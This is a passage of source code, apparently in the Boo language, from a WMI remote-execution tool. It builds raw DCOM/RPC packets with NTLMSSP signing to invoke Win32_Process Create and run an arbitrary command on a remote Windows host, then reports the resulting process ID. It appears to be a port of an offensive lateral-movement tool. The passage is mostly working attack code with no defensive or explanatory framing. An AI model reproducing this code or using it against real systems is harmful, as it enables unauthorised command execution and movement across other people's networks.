                request_auth_padding = 12
                request_call_ID = (of byte: 3, 0, 0, 0)
                request_context_ID = (of byte: 2, 0)
                request_opnum = (of byte: 3, 0)
                request_UUID = object_UUID2
                hostname_length = BitConverter.GetBytes((auth_hostname.Length + 1))
                WMI_client_stage_next = 'AlterContext'
                if Convert.ToBoolean((auth_hostname.Length % 2)):
                  auth_hostname_bytes = CombineByteArray(auth_hostname_bytes, (of byte: 0, 0))
                else:
                  auth_hostname_bytes = CombineByteArray(auth_hostname_bytes, (of byte: 0, 0, 0, 0))
                stub_data = CombineByteArray((of byte: 5, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0), causality_ID_bytes)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0, 0, 0, 2, 0))
                stub_data = CombineByteArray(stub_data, hostname_length)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0))
                stub_data = CombineByteArray(stub_data, hostname_length)
                stub_data = CombineByteArray(stub_data, auth_hostname_bytes)
                stub_data = CombineByteArray(stub_data, process_ID_Bytes)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0, 0, 0))
              elif converterGeneratedName3 == 1:
                sequence_number = (of byte: 2, 0, 0, 0)
                request_flags = (of byte: 131)
                request_auth_padding = 8
                request_call_ID = (of byte: 4, 0, 0, 0)
                request_context_ID = (of byte: 3, 0)
                request_opnum = (of byte: 3, 0)
                request_UUID = IPID
                WMI_client_stage_next = 'Request'
                stub_data = CombineByteArray((of byte: 5, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0), causality_ID_bytes)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
              elif converterGeneratedName3 == 2:
                sequence_number = (of byte: 3, 0, 0, 0)
                request_flags = (of byte: 131)
                request_auth_padding = 0
                request_call_ID = (of byte: 5, 0, 0, 0)
                request_context_ID = (of byte: 3, 0)
                request_opnum = (of byte: 6, 0)
                request_UUID = IPID
                WMI_namespace_length = BitConverter.GetBytes((target_short.Length + 14))
                WMI_namespace_unicode = Encoding.Unicode.GetBytes((('\\\\' + target_short) + '\\root\\cimv2'))
                WMI_client_stage_next = 'Request'
                if Convert.ToBoolean((target_short.Length % 2)):
                  WMI_namespace_unicode = CombineByteArray(WMI_namespace_unicode, (of byte: 0, 0, 0, 0))
                else:
                  WMI_namespace_unicode = CombineByteArray(WMI_namespace_unicode, (of byte: 0, 0))
                stub_data = CombineByteArray((of byte: 5, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0), causality_ID_bytes)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0, 0, 0, 2, 0))
                stub_data = CombineByteArray(stub_data, WMI_namespace_length)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0))
                stub_data = CombineByteArray(stub_data, WMI_namespace_length)
                stub_data = CombineByteArray(stub_data, WMI_namespace_unicode)
                stub_data = CombineByteArray(stub_data, (of byte: 4, 0, 2, 0, 9, 0, 0, 0, 0, 0, 0, 0, 9, 0, 0, 0, 101, 0, 110, 0, 45, 0, 85, 0, 83, 0, 44, 0, 101, 0, 110, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
              elif converterGeneratedName3 == 3:
                sequence_number = (of byte: 4, 0, 0, 0)
                request_flags = (of byte: 131)
                request_auth_padding = 8
                request_context_ID = (of byte: 0, 0)
                request_call_ID = (of byte: 6, 0, 0, 0)
                request_opnum = (of byte: 5, 0)
                request_UUID = object_UUID
                WMI_client_stage_next = 'Request'
                WMI_data = BitConverter.ToString(WMI_client_receive).Replace('-', '')
                OXID_index = WMI_data.IndexOf(OXID)
                OXID_bytes_index = (OXID_index / 2)
                IPID2 = getByteRange(WMI_client_receive, (OXID_bytes_index + 16), (OXID_bytes_index + 31))
                packet_rem_release as OrderedDictionary = GetPacketDCOMRemRelease(causality_ID_bytes, object_UUID2, IPID)
                stub_data = ConvertFromPacketOrderedDictionary(packet_rem_release)
              elif converterGeneratedName3 == 4:
                sequence_number = (of byte: 5, 0, 0, 0)
                request_flags = (of byte: 131)
                request_auth_padding = 4
                request_context_ID = (of byte: 0, 0)
                request_call_ID = (of byte: 7, 0, 0, 0)
                request_opnum = (of byte: 3, 0)
                request_UUID = object_UUID
                WMI_client_stage_next = 'Request'
                packet_rem_query_interface = GetPacketDCOMRemQueryInterface(causality_ID_bytes, IPID2, (of byte: 158, 193, 252, 195, 112, 169, 210, 17, 139, 90, 0, 160, 201, 183, 201, 196))
                stub_data = ConvertFromPacketOrderedDictionary(packet_rem_query_interface)
              elif converterGeneratedName3 == 5:
                sequence_number = (of byte: 6, 0, 0, 0)
                request_flags = (of byte: 131)
                request_auth_padding = 4
                request_call_ID = (of byte: 8, 0, 0, 0)
                request_context_ID = (of byte: 0, 0)
                request_opnum = (of byte: 3, 0)
                request_UUID = object_UUID
                WMI_client_stage_next = 'AlterContext'
                packet_rem_query_interface = GetPacketDCOMRemQueryInterface(causality_ID_bytes, IPID2, (of byte: 131, 178, 150, 177, 180, 186, 26, 16, 182, 156, 0, 170, 0, 52, 29, 7))
                stub_data = ConvertFromPacketOrderedDictionary(packet_rem_query_interface)
              elif converterGeneratedName3 == 6:
                sequence_number = (of byte: 7, 0, 0, 0)
                request_flags = (of byte: 131)
                request_auth_padding = 0
                request_context_ID = (of byte: 4, 0)
                request_call_ID = (of byte: 9, 0, 0, 0)
                request_opnum = (of byte: 6, 0)
                request_UUID = IPID2
                WMI_client_stage_next = 'Request'
                stub_data = CombineByteArray((of byte: 5, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0), causality_ID_bytes)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0, 85, 115, 101, 114, 13, 0, 0, 0, 26, 0, 0, 0, 13, 0, 0, 0, 119, 0, 105, 0, 110, 0, 51, 0, 50, 0, 95, 0, 112, 0, 114, 0, 111, 0, 99, 0, 101, 0, 115, 0, 115, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0))
              elif converterGeneratedName3 == 7:
                sequence_number = (of byte: 8, 0, 0, 0)
                request_flags = (of byte: 131)
                request_auth_padding = 0
                request_context_ID = (of byte: 4, 0)
                request_call_ID = (of byte: 16, 0, 0, 0)
                request_opnum = (of byte: 6, 0)
                request_UUID = IPID2
                WMI_client_stage_next = 'Request'
                stub_data = CombineByteArray((of byte: 5, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0), causality_ID_bytes)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0, 85, 115, 101, 114, 13, 0, 0, 0, 26, 0, 0, 0, 13, 0, 0, 0, 119, 0, 105, 0, 110, 0, 51, 0, 50, 0, 95, 0, 112, 0, 114, 0, 111, 0, 99, 0, 101, 0, 115, 0, 115, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0))
              elif sequence_number[0] >= 8:
                sequence_number = (of byte: 9, 0, 0, 0)
                request_auth_padding = 0
                request_context_ID = (of byte: 4, 0)
                request_call_ID = (of byte: 11, 0, 0, 0)
                request_opnum = (of byte: 24, 0)
                request_UUID = IPID2
                stub_length as (byte) = getByteRange(BitConverter.GetBytes((command.Length + 1769)), 0, 1)
                stub_length2 as (byte) = getByteRange(BitConverter.GetBytes((command.Length + 1727)), 0, 1)
                stub_length3 as (byte) = getByteRange(BitConverter.GetBytes((command.Length + 1713)), 0, 1)
                command_length as (byte) = getByteRange(BitConverter.GetBytes((command.Length + 93)), 0, 1)
                command_length2 as (byte) = getByteRange(BitConverter.GetBytes((command.Length + 16)), 0, 1)
                command_bytes as (byte) = Encoding.UTF8.GetBytes(command)
                command_padding_check as string = Convert.ToString(Decimal.Divide(command.Length, 4))
                if debugging == true:
                  print "command_padding_check: "+  command_padding_check
                if (command_padding_check.Contains(".75") or command_padding_check.Contains(",75")):
                  if debugging == true:
                    print "Adding One Byte"
                  command_bytes = CombineByteArray(command_bytes, (of byte: 0))
                elif (command_padding_check.Contains(".5") or command_padding_check.Contains(",5")):
                  if debugging == true:
                    print "Adding Two Bytes"
                  command_bytes = CombineByteArray(command_bytes, (of byte: 0, 0))
                elif (command_padding_check.Contains(".25") or command_padding_check.Contains(",25")):
                  if debugging == true:
                    print "Adding Three Bytes"
                  command_bytes = CombineByteArray(command_bytes, (of byte: 0, 0, 0))
                else:
                  if debugging == true:
                    print "Adding Four Bytes"
                  command_bytes = CombineByteArray(command_bytes, (of byte: 0, 0, 0, 0))
                stub_data = (of byte: 5, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0)
                stub_data = CombineByteArray(stub_data, causality_ID_bytes)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0, 85, 115, 101, 114, 13, 0, 0, 0, 26, 0, 0, 0, 13, 0, 0, 0, 87, 0, 105, 0, 110, 0, 51, 0, 50, 0, 95, 0, 80, 0, 114, 0, 111, 0, 99, 0, 101, 0, 115, 0, 115, 0, 0, 0, 85, 115, 101, 114, 6, 0, 0, 0, 12, 0, 0, 0, 6, 0, 0, 0, 99, 0, 114, 0, 101, 0, 97, 0, 116, 0, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0))
                stub_data = CombineByteArray(stub_data, stub_length)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0))
                stub_data = CombineByteArray(stub_data, stub_length)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 77, 69, 79, 87, 4, 0, 0, 0, 129, 166, 18, 220, 127, 115, 207, 17, 136, 77, 0, 170, 0, 75, 46, 36, 18, 248, 144, 69, 58, 29, 208, 17, 137, 31, 0, 170, 0, 75, 46, 36, 0, 0, 0, 0))
                stub_data = CombineByteArray(stub_data, stub_length2)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 120, 86, 52, 18))
                stub_data = CombineByteArray(stub_data, stub_length3)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 2, 83, 6, 0, 0, 0, 0, 0, 0, 0, 13, 0, 0, 0, 4, 0, 0, 0, 15, 0, 0, 0, 14, 0, 0, 0, 0, 11, 0, 0, 0, 255, 255, 3, 0, 0, 0, 42, 0, 0, 0, 21, 1, 0, 0, 115, 1, 0, 0, 118, 2, 0, 0, 212, 2, 0, 0, 177, 3, 0, 0, 21, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 18, 4, 0, 128, 0, 95, 95, 80, 65, 82, 65, 77, 69, 84, 69, 82, 83, 0, 0, 97, 98, 115, 116, 114, 97, 99, 116, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 67, 111, 109, 109, 97, 110, 100, 76, 105, 110, 101, 0, 0, 115, 116, 114, 105, 110, 103, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 17, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 55, 0, 0, 0, 0, 73, 110, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 28, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 55, 0, 0, 0, 94, 0, 0, 0, 2, 11, 0, 0, 0, 255, 255, 1, 0, 0, 0, 148, 0, 0, 0, 0, 87, 105, 110, 51, 50, 65, 80, 73, 124, 80, 114, 111, 99, 101, 115, 115, 32, 97, 110, 100, 32, 84, 104, 114, 101, 97, 100, 32, 70, 117, 110, 99, 116, 105, 111, 110, 115, 124, 108, 112, 67, 111, 109, 109, 97, 110, 100, 76, 105, 110, 101, 32, 0, 0, 77, 97, 112, 112, 105, 110, 103, 83, 116, 114, 105, 110, 103, 115, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 55, 0, 0, 0, 94, 0, 0, 0, 2, 11, 0, 0, 0, 255, 255, 202, 0, 0, 0, 2, 8, 32, 0, 0, 140, 0, 0, 0, 0, 73, 68, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 54, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 89, 1, 0, 0, 94, 0, 0, 0, 0, 11, 0, 0, 0, 255, 255, 202, 0, 0, 0, 2, 8, 32, 0, 0, 140, 0, 0, 0, 17, 1, 0, 0, 17, 3, 0, 0, 0, 0, 0, 0, 0, 0, 115, 116, 114, 105, 110, 103, 0, 8, 0, 0, 0, 1, 0, 4, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 67, 117, 114, 114, 101, 110, 116, 68, 105, 114, 101, 99, 116, 111, 114, 121, 0, 0, 115, 116, 114, 105, 110, 103, 0, 8, 0, 0, 0, 1, 0, 4, 0, 0, 0, 0, 0, 0, 0, 17, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 133, 1, 0, 0, 0, 73, 110, 0, 8, 0, 0, 0, 1, 0, 4, 0, 0, 0, 0, 0, 0, 0, 28, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 133, 1, 0, 0, 172, 1, 0, 0, 2, 11, 0, 0, 0, 255, 255, 1, 0, 0, 0, 226, 1, 0, 0, 0, 87, 105, 110, 51, 50, 65, 80, 73, 124, 80, 114, 111, 99, 101, 115, 115, 32, 97, 110, 100, 32, 84, 104, 114, 101, 97, 100, 32, 70, 117, 110, 99, 116, 105, 111, 110, 115, 124, 67, 114, 101, 97, 116, 101, 80, 114, 111, 99, 101, 115, 115, 124, 108, 112, 67, 117, 114, 114, 101, 110, 116, 68, 105, 114, 101, 99, 116, 111, 114, 121, 32, 0, 0, 77, 97, 112, 112, 105, 110, 103, 83, 116, 114, 105, 110, 103, 115, 0, 8, 0, 0, 0, 1, 0, 4, 0, 0, 0, 0, 0, 0, 0, 41, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 133, 1, 0, 0, 172, 1, 0, 0, 2, 11, 0, 0, 0, 255, 255, 43, 2, 0, 0, 2, 8, 32, 0, 0, 218, 1, 0, 0, 0, 73, 68, 0, 8, 0, 0, 0, 1, 0, 4, 0, 0, 0, 0, 0, 0, 0, 54, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 186, 2, 0, 0, 172, 1, 0, 0, 0, 11, 0, 0, 0, 255, 255, 43, 2, 0, 0, 2, 8, 32, 0, 0, 218, 1, 0, 0, 114, 2, 0, 0, 17, 3, 0, 0, 0, 1, 0, 0, 0, 0, 115, 116, 114, 105, 110, 103, 0, 13, 0, 0, 0, 2, 0, 8, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 80, 114, 111, 99, 101, 115, 115, 83, 116, 97, 114, 116, 117, 112, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 0, 0, 111, 98, 106, 101, 99, 116, 0, 13, 0, 0, 0, 2, 0, 8, 0, 0, 0, 0, 0, 0, 0, 17, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 239, 2, 0, 0, 0, 73, 110, 0, 13, 0, 0, 0, 2, 0, 8, 0, 0, 0, 0, 0, 0, 0, 28, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 239, 2, 0, 0, 22, 3, 0, 0, 2, 11, 0, 0, 0, 255, 255, 1, 0, 0, 0, 76, 3, 0, 0, 0, 87, 77, 73, 124, 87, 105, 110, 51, 50, 95, 80, 114, 111, 99, 101, 115, 115, 83, 116, 97, 114, 116, 117, 112, 0, 0, 77, 97, 112, 112, 105, 110, 103, 83, 116, 114, 105, 110, 103, 115, 0, 13, 0, 0, 0, 2, 0, 8, 0, 0, 0, 0, 0, 0, 0, 41, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 239, 2, 0, 0, 22, 3, 0, 0, 2, 11, 0, 0, 0, 255, 255, 102, 3, 0, 0, 2, 8, 32, 0, 0, 68, 3, 0, 0, 0, 73, 68, 0, 13, 0, 0, 0, 2, 0, 8, 0, 0, 0, 0, 0, 0, 0, 54, 0, 0, 0, 10, 0, 0, 128, 3, 8, 0, 0, 0, 245, 3, 0, 0, 22, 3, 0, 0, 0, 11, 0, 0, 0, 255, 255, 102, 3, 0, 0, 2, 8, 32, 0, 0, 68, 3, 0, 0, 173, 3, 0, 0, 17, 3, 0, 0, 0, 2, 0, 0, 0, 0, 111, 98, 106, 101, 99, 116, 58, 87, 105, 110, 51, 50, 95, 80, 114, 111, 99, 101, 115, 115, 83, 116, 97, 114, 116, 117, 112))
                stub_data = CombineByteArray(stub_data, array(byte, 501))
                stub_data = CombineByteArray(stub_data, command_length)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0, 0, 0, 0, 60, 14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 1))
                stub_data = CombineByteArray(stub_data, command_length2)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 128, 0, 95, 95, 80, 65, 82, 65, 77, 69, 84, 69, 82, 83, 0, 0))
                stub_data = CombineByteArray(stub_data, command_bytes)
                stub_data = CombineByteArray(stub_data, (of byte: 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0))
                if stub_data.Length < request_split_index:
                  request_flags = (of byte: 131)
                  WMI_client_stage_next = 'Result'
                else:
                  request_split = true
                  request_split_stage_final as double = Math.Ceiling(((stub_data.Length cast double) / request_split_index))
                  if request_split_stage < 2:
                    request_length = stub_data.Length
                    stub_data = getByteRange(stub_data, 0, (request_split_index - 1))
                    request_split_stage = 2
                    sequence_number_counter = 10
                    request_flags = (of byte: 129)
                    request_split_index_tracker = request_split_index
                    WMI_client_stage_next = 'Request'
                  elif request_split_stage == request_split_stage_final:
                    request_split = false
                    sequence_number = BitConverter.GetBytes(sequence_number_counter)
                    request_split_stage = 0
                    stub_data = getByteRange(stub_data, request_split_index_tracker, stub_data.Length)
                    request_flags = (of byte: 130)
                    WMI_client_stage_next = 'Result'
                  else:
                    request_length = (stub_data.Length - request_split_index_tracker)
                    stub_data = getByteRange(stub_data, request_split_index_tracker, ((request_split_index_tracker + request_split_index) - 1))
                    request_split_index_tracker += request_split_index
                    request_split_stage += 1
                    sequence_number = BitConverter.GetBytes(sequence_number_counter)
                    sequence_number_counter += 1
                    request_flags = (of byte: 128)
                    WMI_client_stage_next = 'Request'
              packet_RPC = GetPacketRPCRequest(request_flags, stub_data.Length, 16, request_auth_padding, request_call_ID, request_context_ID, request_opnum, request_UUID)
              if request_split:
                packet_RPC['RPCRequest_AllocHint'] = BitConverter.GetBytes(request_length)
              packet_NTLMSSP_verifier = GetPacketNTLMSSPVerifier(request_auth_padding, (of byte: 4), sequence_number)
              RPC = ConvertFromPacketOrderedDictionary(packet_RPC)
              NTLMSSP_verifier = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier)
              RPC_Sign = CombineByteArray(sequence_number, RPC)
              RPC_Sign = CombineByteArray(RPC_Sign, stub_data)
              RPC_Sign = CombineByteArray(RPC_Sign, getByteRange(NTLMSSP_verifier, 0, (request_auth_padding + 7)))
              RPC_signature = HMAC_MD5.ComputeHash(RPC_Sign)
              RPC_signature = getByteRange(RPC_signature, 0, 7)
              packet_NTLMSSP_verifier['NTLMSSPVerifier_NTLMSSPVerifierChecksum'] = RPC_signature
              NTLMSSP_verifier = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier)
              WMI_client_send = CombineByteArray(RPC, stub_data)
              WMI_client_send = CombineByteArray(WMI_client_send, NTLMSSP_verifier)
              WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length)
              WMI_client_random_port_stream.Flush()
              if not request_split:
                WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length)
              while WMI_client_random_port_stream.DataAvailable:
                WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length)
                Thread.Sleep(10)
              WMI_client_stage = WMI_client_stage_next
            elif converterGeneratedName1 == 'Result':
              while WMI_client_random_port_stream.DataAvailable:
                WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length)
                Thread.Sleep(10)
              if WMI_client_receive[1145] != 9:
                target_process_ID as int = DataLength2(1141, WMI_client_receive)
                print "Command executed with process ID " + target_process_ID + " on " + target_long
              else:
                print "Process did not start, check your command"
              WMI_client_stage = 'exit'
            Thread.Sleep(10)
          WMI_client_random_port.Close()
          WMI_client_random_port_stream.Close()
      WMI_client.Close()


  public static def getByteRange(array as (byte), start as int, end as int) as (byte):
    newArray = array.Skip(start).Take(((end - start) + 1)).ToArray()
    return newArray

  private static def CombineByteArray(a as (byte), b as (byte)) as (byte):
    c as (byte) = array(byte, (a.Length + b.Length))
    Buffer.BlockCopy(a, 0, c, 0, a.Length)
    Buffer.BlockCopy(b, 0, c, a.Length, b.Length)
    return c

  public static def StringToByteArray(hex as string) as (byte):
    return Enumerable.Range(0, hex.Length).Where({ x | return ((x % 2) == 0) }).Select({ x | return Convert.ToByte(hex.Substring(x, 2), 16) }).ToArray()

  private static def ConvertFromPacketOrderedDictionary(packet_ordered_dictionary as OrderedDictionary) as (byte):
    byte_list as List[of (byte)] = List[of (byte)]()
    for de as DictionaryEntry in packet_ordered_dictionary:
      byte_list.Add((de.Value as (byte)))
    flattenedList = byte_list.SelectMany({ bytes | return bytes })
    byte_Array as (byte) = flattenedList.ToArray()
    return byte_Array

  private static def GetPacketRPCBind(packet_call_ID as int, packet_max_frag as (byte), packet_num_ctx_items as (byte), packet_context_ID as (byte), packet_UUID as (byte), packet_UUID_version as (byte)) as OrderedDictionary:
    packet_call_ID_bytes as (byte) = BitConverter.GetBytes(packet_call_ID)
    packet_RPCBind = OrderedDictionary()
    packet_RPCBind.Add('RPCBind_Version', (of byte: 5))
    packet_RPCBind.Add('RPCBind_VersionMinor', (of byte: 0))
    packet_RPCBind.Add('RPCBind_PacketType', (of byte: 11))
    packet_RPCBind.Add('RPCBind_PacketFlags', (of byte: 3))
    packet_RPCBind.Add('RPCBind_DataRepresentation', (of byte: 16, 0, 0, 0))
    packet_RPCBind.Add('RPCBind_FragLength', (of byte: 72, 0))
    packet_RPCBind.Add('RPCBind_AuthLength', (of byte: 0, 0))
    packet_RPCBind.Add('RPCBind_CallID', packet_call_ID_bytes)
    packet_RPCBind.Add('RPCBind_MaxXmitFrag', (of byte: 184, 16))
    packet_RPCBind.Add('RPCBind_MaxRecvFrag', (of byte: 184, 16))
    packet_RPCBind.Add('RPCBind_AssocGroup', (of byte: 0, 0, 0, 0))
    packet_RPCBind.Add('RPCBind_NumCtxItems', packet_num_ctx_items)
    packet_RPCBind.Add('RPCBind_Unknown', (of byte: 0, 0, 0))
    packet_RPCBind.Add('RPCBind_ContextID', packet_context_ID)
    packet_RPCBind.Add('RPCBind_NumTransItems', (of byte: 1))
    packet_RPCBind.Add('RPCBind_Unknown2', (of byte: 0))
    packet_RPCBind.Add('RPCBind_Interface', packet_UUID)
    packet_RPCBind.Add('RPCBind_InterfaceVer', packet_UUID_version)
    packet_RPCBind.Add('RPCBind_InterfaceVerMinor', (of byte: 0, 0))
    packet_RPCBind.Add('RPCBind_TransferSyntax', (of byte: 4, 93, 136, 138, 235, 28, 201, 17, 159, 232, 8, 0, 43, 16, 72, 96))
    packet_RPCBind.Add('RPCBind_TransferSyntaxVer', (of byte: 2, 0, 0, 0))
    if packet_num_ctx_items[0] == 2:
      packet_RPCBind.Add('RPCBind_ContextID2', (of byte: 1, 0))
      packet_RPCBind.Add('RPCBind_NumTransItems2', (of byte: 1))
      packet_RPCBind.Add('RPCBind_Unknown3', (of byte: 0))
      packet_RPCBind.Add('RPCBind_Interface2', (of byte: 196, 254, 252, 153, 96, 82, 27, 16, 187, 203, 0, 170, 0, 33, 52, 122))
      packet_RPCBind.Add('RPCBind_InterfaceVer2', (of byte: 0, 0))
      packet_RPCBind.Add('RPCBind_InterfaceVerMinor2', (of byte: 0, 0))
      packet_RPCBind.Add('RPCBind_TransferSyntax2', (of byte: 44, 28, 183, 108, 18, 152, 64, 69, 3, 0, 0, 0, 0, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_TransferSyntaxVer2', (of byte: 1, 0, 0, 0))
    elif packet_num_ctx_items[0] == 3:
      packet_RPCBind.Add('RPCBind_ContextID2', (of byte: 1, 0))
      packet_RPCBind.Add('RPCBind_NumTransItems2', (of byte: 1))
      packet_RPCBind.Add('RPCBind_Unknown3', (of byte: 0))
      packet_RPCBind.Add('RPCBind_Interface2', (of byte: 67, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
      packet_RPCBind.Add('RPCBind_InterfaceVer2', (of byte: 0, 0))
      packet_RPCBind.Add('RPCBind_InterfaceVerMinor2', (of byte: 0, 0))
      packet_RPCBind.Add('RPCBind_TransferSyntax2', (of byte: 51, 5, 113, 113, 186, 190, 55, 73, 131, 25, 181, 219, 239, 156, 204, 54))
      packet_RPCBind.Add('RPCBind_TransferSyntaxVer2', (of byte: 1, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_ContextID3', (of byte: 2, 0))
      packet_RPCBind.Add('RPCBind_NumTransItems3', (of byte: 1))
      packet_RPCBind.Add('RPCBind_Unknown4', (of byte: 0))
      packet_RPCBind.Add('RPCBind_Interface3', (of byte: 67, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70))
      packet_RPCBind.Add('RPCBind_InterfaceVer3', (of byte: 0, 0))
      packet_RPCBind.Add('RPCBind_InterfaceVerMinor3', (of byte: 0, 0))
      packet_RPCBind.Add('RPCBind_TransferSyntax3', (of byte: 44, 28, 183, 108, 18, 152, 64, 69, 3, 0, 0, 0, 0, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_TransferSyntaxVer3', (of byte: 1, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_AuthType', (of byte: 10))
      packet_RPCBind.Add('RPCBind_AuthLevel', (of byte: 4))
      packet_RPCBind.Add('RPCBind_AuthPadLength', (of byte: 0))
      packet_RPCBind.Add('RPCBind_AuthReserved', (of byte: 0))
      packet_RPCBind.Add('RPCBind_ContextID4', (of byte: 0, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_Identifier', (of byte: 78, 84, 76, 77, 83, 83, 80, 0))
      packet_RPCBind.Add('RPCBind_MessageType', (of byte: 1, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_NegotiateFlags', (of byte: 151, 130, 8, 226))
      packet_RPCBind.Add('RPCBind_CallingWorkstationDomain', (of byte: 0, 0, 0, 0, 0, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_CallingWorkstationName', (of byte: 0, 0, 0, 0, 0, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_OSVersion', (of byte: 6, 1, 177, 29, 0, 0, 0, 15))
    if packet_call_ID == 3:
      packet_RPCBind.Add('RPCBind_AuthType', (of byte: 10))
      packet_RPCBind.Add('RPCBind_AuthLevel', (of byte: 2))
      packet_RPCBind.Add('RPCBind_AuthPadLength', (of byte: 0))
      packet_RPCBind.Add('RPCBind_AuthReserved', (of byte: 0))
      packet_RPCBind.Add('RPCBind_ContextID3', (of byte: 0, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_Identifier', (of byte: 78, 84, 76, 77, 83, 83, 80, 0))
      packet_RPCBind.Add('RPCBind_MessageType', (of byte: 1, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_NegotiateFlags', (of byte: 151, 130, 8, 226))
      packet_RPCBind.Add('RPCBind_CallingWorkstationDomain', (of byte: 0, 0, 0, 0, 0, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_CallingWorkstationName', (of byte: 0, 0, 0, 0, 0, 0, 0, 0))
      packet_RPCBind.Add('RPCBind_OSVersion', (of byte: 6, 1, 177, 29, 0, 0, 0, 15))
    return packet_RPCBind

  private static def GetPacketRPCAuth3(packet_NTLMSSP as (byte)) as OrderedDictionary:
    packet_NTLMSSP_length as (byte) = BitConverter.GetBytes(packet_NTLMSSP.Length)
    packet_NTLMSSP_length = (of byte: packet_NTLMSSP_length[0], packet_NTLMSSP_length[1])
    packet_RPC_length as (byte) = BitConverter.GetBytes((packet_NTLMSSP.Length + 28))
    packet_RPC_length = (of byte: packet_RPC_length[0], packet_RPC_length[1])
    packet_RPCAuth3 = OrderedDictionary()
    packet_RPCAuth3.Add('RPCAUTH3_Version', (of byte: 5))
    packet_RPCAuth3.Add('RPCAUTH3_VersionMinor', (of byte: 0))
    packet_RPCAuth3.Add('RPCAUTH3_PacketType', (of byte: 16))
    packet_RPCAuth3.Add('RPCAUTH3_PacketFlags', (of byte: 3))
    packet_RPCAuth3.Add('RPCAUTH3_DataRepresentation', (of byte: 16, 0, 0, 0))
    packet_RPCAuth3.Add('RPCAUTH3_FragLength', packet_RPC_length)
    packet_RPCAuth3.Add('RPCAUTH3_AuthLength', packet_NTLMSSP_length)
    packet_RPCAuth3.Add('RPCAUTH3_CallID', (of byte: 3, 0, 0, 0))
    packet_RPCAuth3.Add('RPCAUTH3_MaxXmitFrag', (of byte: 208, 22))
    packet_RPCAuth3.Add('RPCAUTH3_MaxRecvFrag', (of byte: 208, 22))
